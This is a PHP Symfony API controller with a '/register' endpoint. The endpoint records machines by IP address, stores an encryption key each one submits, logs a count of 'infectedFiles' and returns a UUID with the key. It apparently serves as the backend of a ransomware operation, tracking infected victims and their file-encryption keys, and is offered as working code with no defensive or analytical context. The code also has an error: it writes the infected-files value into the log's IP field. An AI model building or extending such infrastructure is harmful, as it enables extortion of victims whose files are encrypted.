<?php

namespace App\Controller\Api;

use App\Controller\BaseController;
use App\Entity\Log;
use App\Entity\User;
use App\Repository\LogRepository;
use App\Repository\UserRepository;
use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\PasswordHasher\Hasher\UserPasswordHasherInterface;
use Symfony\Component\Routing\Annotation\Route;
use Symfony\Component\Uid\Uuid;

class UserController extends BaseController
{
    public function __construct(
        private UserPasswordHasherInterface $passwordHasher,
        private UserRepository $userRepository,
        private LogRepository $logRepository
    ) {}

    /**
     * @Route("/register", methods={"POST"})
     */
    public function register(Request $request): Response
    {
        try {
            $data = json_decode($request->getContent(), true);

            $ip = $data['ip'];
            $encryptionKey = $data['encryptionKey'];

            $user = $this->userRepository->findOneBy(['ip' => $ip]) ?? new User();

            $uuid = Uuid::v4();

            $user->setIp($ip)
                ->setPassword($this->passwordHasher->hashPassword(
                    $user,
                    $uuid
                ))
                ->setEncryptionKey($encryptionKey)
                ->setRoles(['ROLE_USER']);

            $this->userRepository->save($user, true);

            $log = (new Log)
                ->setIp($ip);

            if(array_key_exists('infectedFiles', $data)) $log->setIp($data['infectedFiles']);

            $this->logRepository->save($log, true);

            $response = [
                'uuid' => $uuid,
                'encryptionKey' => $encryptionKey
            ];

            return $this->json($response);
        } catch(\Throwable $e) {
            return $this->failure($e->getMessage() ?? 'Une erreur est survenue');
        }
    }
}